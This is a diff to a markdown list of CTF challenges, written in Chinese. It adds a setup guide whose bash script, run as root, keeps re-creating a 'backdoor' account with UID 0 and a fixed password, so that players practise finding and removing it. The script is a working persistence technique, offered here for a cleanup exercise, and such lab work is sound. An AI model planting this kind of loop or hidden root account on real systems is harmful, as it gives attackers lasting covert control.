@@ -25,6 +25,35 @@ Is there really nothing at all?
 
 **动态环境**
 
+> 环境复现指南
+> 写一个bash脚本（原题脚本）
+> ```bash
+> #!/bin/bash
+> 
+> # 定义要检查的用户名
+> USERNAME="backdoor"
+> PASSWD_FILE="/etc/passwd"
+> 
+> # 无限循环，直到手动停止
+> while true; do
+>   # 检查是否存在 backdoor 用户
+>   if ! grep -q "^${USERNAME}:" $PASSWD_FILE; then
+>     
+>     # 创建 backdoor 用户，设置 UID 和 GID 都为 0
+>     useradd -u 0 -o -s /sbin/nologin ${USERNAME}
+> 
+>     # 设置密码
+>     echo "${USERNAME}:password" | chpasswd
+>   fi
+> 
+>   # 休眠一段时间，例如 5 秒
+>   sleep 5
+> done
+> ```
+> root运行
+> 然后每分钟check /etc/passwd 是否存在backdoor用户
+> 创建用户ctf，登录尝试清理
+
 ### 问卷
 
 **问卷链接已隐藏**
@@ -91,11 +120,11 @@ You came across a strange piece of front-end code. A seemingly simple button alw
 
 **动态环境**
 
-**[环境下载](ezGetFlag.zip)**
-
 ### ezFindShell
 
 "Separate the wheat from the chaff"
+
+**[环境下载](ezFindShell.zip)**
 
 **动态环境**
 
